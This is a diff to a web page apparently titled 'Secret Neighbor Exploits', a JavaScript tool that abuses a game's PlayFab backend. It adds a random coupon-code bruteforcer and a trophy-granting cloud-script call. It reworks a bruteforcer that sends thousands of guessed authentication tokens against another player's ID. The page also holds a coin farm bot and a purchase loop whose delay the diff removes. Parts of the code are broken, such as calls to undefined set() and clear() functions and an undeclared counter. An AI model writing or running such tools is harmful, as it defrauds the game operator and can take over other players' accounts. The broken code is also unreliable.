@@ -174,6 +174,23 @@
     .reset-penalty-btn:hover {
       background-color: #1976D2;
     }
+
+    .redeem-coupon-btn {
+      background-color: #9c27b0;
+    }
+
+    .redeem-coupon-btn:hover {
+      background-color: #7b1fa2;
+    }
+
+    .grant-trophy-btn {
+      background-color: #ffeb3b;
+      color: black;
+    }
+
+    .grant-trophy-btn:hover {
+      background-color: #fbc02d;
+    }
   </style>
 </head>
 <body>
@@ -406,6 +423,15 @@
           <input id="targetPlayerId" placeholder="Target PlayFab ID" type="text">
           <button onclick="reportPlayer()">Report Player</button>
         </div>
+        <div>
+          <h3>🎟️ Bruteforce Redeem Coupon <span id="couponBruteforceStatus" class="status-indicator status-inactive"></span></h3>
+          <button class="redeem-coupon-btn" onclick="toggleBruteforceRedeemCoupon()" id="couponBruteforceToggleButton">Start Bruteforce Redeem Coupon</button>
+        </div>
+        <div>
+          <h3>🏆 Grant Trophy</h3>
+          <input id="trophyId" placeholder="Trophy ID" type="text">
+          <button class="grant-trophy-btn" onclick="grantTrophy()">Grant Trophy</button>
+        </div>
       </div>
       <div class="output" id="apiOutput">API results will appear here...</div>
     </div>
@@ -453,12 +479,17 @@
     const titleId = "bdff1";
     let sessionTicket = null;
     let coinFarmBotRunning = false;
-    let coinFarmIntervalId = null;
+    let coinFarmId = null;
     let levelEditorRunning = false;
-    let levelEditorIntervalId = null;
+    let levelEditorId = null;
     let bruteforceRunning = false;
     let photonTokenRunning = false;
-    let photonTokenIntervalId = null;
+    let photonTokenId = null;
+    let couponBruteforceRunning = false;
+    let couponBruteforceId = null;
+    let failedAttempts = 0;
+    const logEntries = [];
+    let totalTokensGenerated = 0;
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -683,8 +714,6 @@
             output.textContent += `❌ Error: ${err.message}\n`;
             failedPurchases++;
           }
-          
-          await new Promise(resolve => setTimeout(resolve, 500));
         }
         
         output.textContent += `\n🎉 Purchase process completed!\n`;
@@ -1238,7 +1267,7 @@
 
     function toggleCoinFarmBot() {
       if (coinFarmBotRunning) {
-        clearInterval(coinFarmIntervalId);
+        clear(coinFarmId);
         coinFarmBotRunning = false;
         document.getElementById("botStatus").className = "status-indicator status-inactive";
         document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
@@ -1254,7 +1283,7 @@
       document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";
 
       document.getElementById("cloudOutput").textContent = 
-        `Starting Coin Farm Bot with ${delayMinutes} minute interval...\n`;
+        `Starting Coin Farm Bot with ${delayMinutes} minute ...\n`;
 
       async function runCoinFarmCycle() {
         const roomType = document.getElementById("roomType").value;
@@ -1361,12 +1390,12 @@
       }
 
       runCoinFarmCycle();
-      coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
+      coinFarmId = set(runCoinFarmCycle, delayMs);
     }
 
     function toggleLevelEditor() {
       if (levelEditorRunning) {
-        clearInterval(levelEditorIntervalId);
+        clear(levelEditorId);
         levelEditorRunning = false;
         document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
         document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
@@ -1402,12 +1431,12 @@
       }
 
       runLevelEditorCycle();
-      levelEditorIntervalId = setInterval(runLevelEditorCycle, 1000);
+      levelEditorId = set(runLevelEditorCycle, 1000);
     }
 
     function togglePhotonTokenGenerator() {
       if (photonTokenRunning) {
-        clearInterval(photonTokenIntervalId);
+        clear(photonTokenId);
         photonTokenRunning = false;
         document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
         document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
@@ -1437,7 +1466,7 @@
       }
 
       generatePhotonToken();
-      photonTokenIntervalId = setInterval(generatePhotonToken, 1000);
+      photonTokenId = set(generatePhotonToken, 1000);
     }
 
     async function resetLoadout() {
@@ -1492,94 +1521,228 @@
       }
     }
 
-  function generateRandomToken() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  const tokenLength = 50; // Standard UUID-like length for Photon tokens
-  let token = '';
-  for (let i = 0; i < tokenLength; i++) {
-    token += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return token;
-}
-
-async function checkToken(playFabId, token) {
-  try {
-    const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
-      method: 'GET',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Authorization': sessionTicket
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      const tokenLength = 50;
+      let token = '';
+      for (let i = 0; i < tokenLength; i++) {
+        token += chars.charAt(Math.floor(Math.random() * chars.length));
       }
-    });
-    return { token, result: await response.json() };
-  } catch (error) {
-    return { token, error: error.message };
-  }
-}
+      totalTokensGenerated++;
+      return token;
+    }
 
-async function startBruteforce() {
-  if (bruteforceRunning) return;
+    async function checkToken(playFabId, token) {
+      try {
+        const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Authorization': sessionTicket
+          }
+        });
+        const result = await response.json();
+        return { token, result };
+      } catch (error) {
+        return { token, error: error.message };
+      }
+    }
 
-  const playFabId = document.getElementById("playFabUsername").value.trim();
-  const output = document.getElementById("bruteforceOutput");
+    function downloadLog() {
+      const logContent = logEntries.join('\n');
+      const blob = new Blob([logContent], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `bruteforce_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
 
-  if (!playFabId) {
-    output.textContent = "Please enter a PlayFab ID.";
+    async function startBruteforce() {
+      if (bruteforceRunning) return;
+
+      const playFabId = document.getElementById("playFabUsername").value.trim();
+      const output = document.getElementById("bruteforceOutput");
+
+      if (!playFabId) {
+        output.textContent = "Please enter a PlayFab ID.";
+        return;
+      }
+
+      if (!sessionTicket) {
+        output.textContent = "Please set your SessionTicket first.";
+        return;
+      }
+
+      bruteforceRunning = true;
+      failedAttempts = 0;
+      totalTokensGenerated = 0;
+      logEntries.length = 0; // Clear previous logs
+      let foundValid = false;
+      output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
+
+      async function tryTokenBatch() {
+        if (!bruteforceRunning) return;
+
+        const batchSize = 1000;
+        const tokens = Array.from({ length: batchSize }, generateRandomToken);
+        const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
+
+        const outputBuffer = [];
+
+        for (const { token, result, error } of results) {
+          if (error) {
+            failedAttempts++;
+            const logEntry = `Error for token ${token}: ${error}`;
+            logEntries.push(logEntry);
+            outputBuffer.push(logEntry);
+          } else {
+            const logEntry = `Token: ${token}, ResultCode: ${result.resultCode}, Response: ${JSON.stringify(result)}`;
+            logEntries.push(logEntry);
+            if (result.resultCode === 1) {
+              outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
+              foundValid = true;
+            } else {
+              failedAttempts++;
+            }
+          }
+        }
+
+        if (outputBuffer.length > 0) {
+          output.textContent += outputBuffer.join('\n') + '\n';
+          output.scrollTop = output.scrollHeight;
+        }
+
+        if (foundValid) {
+          output.textContent += `Valid token found: ${results.find(r => r.result?.resultCode === 1).token}\n`;
+          logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+          downloadLog();
+          stopBruteforce();
+        } else if (bruteforceRunning) {
+          setTimeout(tryTokenBatch, 0);
+        }
+      }
+
+      tryTokenBatch().catch(error => {
+        const errorMsg = `Batch error: ${error.message}`;
+        logEntries.push(errorMsg);
+        output.textContent += errorMsg + '\n';
+        output.scrollTop = output.scrollHeight;
+        logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+        downloadLog();
+        stopBruteforce();
+      });
+    }
+
+    function stopBruteforce() {
+      bruteforceRunning = false;
+      const output = document.getElementById("bruteforceOutput");
+      output.textContent += `Photon token bruteforce stopped. Failed Attempts: ${failedAttempts}\n`;
+      output.scrollTop = output.scrollHeight;
+      logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
+      downloadLog();
+    }
+
+  function toggleBruteforceRedeemCoupon() {
+  if (couponBruteforceRunning) {
+    clear(couponBruteforceId);
+    couponBruteforceRunning = false;
+    document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
+    document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
+    document.getElementById("apiOutput").textContent += `\nCoupon bruteforce stopped manually. Total attempts: ${attempts}\n`;
+    document.getElementById("apiOutput").scrollTop = document.getElementById("apiOutput").scrollHeight;
     return;
   }
 
   if (!sessionTicket) {
-    output.textContent = "Please set your SessionTicket first.";
+    document.getElementById("apiOutput").textContent = "Please set your SessionTicket first.\n";
     return;
   }
 
-  bruteforceRunning = true;
-  let foundValid = false; // Declare foundValid here
-  output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
+  couponBruteforceRunning = true;
+  attempts = 0; // Reset attempts counter
+  document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
+  document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
+  document.getElementById("apiOutput").textContent = "Starting coupon bruteforce...\n";
 
-  async function tryTokenBatch() {
-    if (!bruteforceRunning) return;
-
-    const batchSize = 1000;
-    const tokens = Array.from({ length: batchSize }, generateRandomToken);
-    const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
-
-    const outputBuffer = [];
-
-    for (const { token, result, error } of results) {
-      if (error) {
-        outputBuffer.push(`Error for token ${token}: ${error}`);
-      } else if (result.resultCode === 1) {
-        outputBuffer.push(`✅ Valid token found: ${token}`);
-        foundValid = true;
-      }
+  function generateCouponCode() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let code = '';
+    for (let i = 0; i < 3; i++) {
+      code += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-
-    if (outputBuffer.length > 0) {
-      output.textContent += outputBuffer.join('\n') + '\n';
-      output.scrollTop = output.scrollHeight;
+    code += '-';
+    for (let i = 0; i < 4; i++) {
+      code += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-
-    if (!foundValid && bruteforceRunning) {
-      setTimeout(tryTokenBatch, 0); // Delay to prevent rate limiting
-    } else if (foundValid) {
-      stopBruteforce();
+    code += '-';
+    for (let i = 0; i < 3; i++) {
+      code += chars.charAt(Math.floor(Math.random() * chars.length));
     }
+    return code;
   }
 
-  tryTokenBatch().catch(error => {
-    output.textContent += `Batch error: ${error.message}\n`;
+  async function runCouponBruteforce() {
+    if (!couponBruteforceRunning) return;
+
+    const couponCode = generateCouponCode();
+    attempts++;
+    const output = document.getElementById("apiOutput");
+    output.textContent += `Attempt ${attempts}: Trying ${couponCode}...\n`;
+
+    try {
+      const data = await makeApiCall("Client/RedeemCoupon", "POST", {
+        CouponCode: couponCode,
+        CatalogVersion: "Ingame"
+      });
+
+      if (data.error) {
+        output.textContent += `❌ Failed: ${data.errorMessage || data.error}\n`;
+      } else {
+        output.textContent += `✅ Success! Coupon ${couponCode} redeemed!\n`;
+        output.textContent += formatResponse(data.data);
+        toggleBruteforceRedeemCoupon(); // Stop on success
+      }
+    } catch (err) {
+      output.textContent += `❌ Error: ${err.message}\n`;
+    }
+
     output.scrollTop = output.scrollHeight;
-    stopBruteforce();
-  });
+  }
+
+  runCouponBruteforce();
+  couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000); // 1
 }
 
-function stopBruteforce() {
-  bruteforceRunning = false;
-  const output = document.getElementById("bruteforceOutput");
-  output.textContent += "Photon token bruteforce stopped.\n";
-  output.scrollTop = output.scrollHeight;
-}
+    async function grantTrophy() {
+      const trophyId = document.getElementById("trophyId").value.trim();
+      const output = document.getElementById("apiOutput");
+
+      if (!trophyId) {
+        output.textContent = "Please enter a Trophy ID.";
+        return;
+      }
+
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        FunctionName: "grantTrophy",
+        FunctionParameter: {
+          trophyToGrant: trophyId
+        },
+        GeneratePlayStreamEvent: true
+      });
+
+      if (data.error) {
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data && data.data.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
+      } else {
+        output.textContent = formatResponse(data.data);
+      }
+      output.scrollTop = output.scrollHeight;
+    }
 
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
